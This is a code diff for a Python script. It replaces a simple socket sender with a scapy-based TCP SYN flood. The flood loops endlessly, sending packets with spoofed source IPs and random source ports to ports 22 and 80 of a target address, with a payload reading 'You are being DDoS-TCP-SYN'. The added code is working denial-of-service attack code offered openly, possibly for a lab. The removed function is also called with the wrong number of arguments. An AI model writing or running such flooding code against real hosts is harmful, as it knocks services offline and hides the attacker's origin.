@@ -1,10 +1,15 @@
-import socket
-import pickle
+from scapy.all import *
+from rport import *
+ttl = 99
+id = 1111
+dport = [22,80]
+message = b'You are being DDoS-TCP-SYN'
+def TCP_SYN(ip):
+	while 1:
+		sport = randomize_port()
+		ipv4 = spoof_ipv4()
+		packet = IP(src=ipv4,dst=ip,id=id,ttl=ttl)/TCP(sport=sport,dport=dport,seq=3333,ack=1000,window=1000,flags='S')/message
+		send(packet)
+		print(packet.show())
 
-def send_TCP_PACKET(ip,port):
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip, port))
-    msg_byte = pickle.dumps(message)
-    s.close()
-
-send_TCP_PACKET("192.168.200.5",31337,20000,"xyang70")
+TCP_SYN("192.168.0.1")
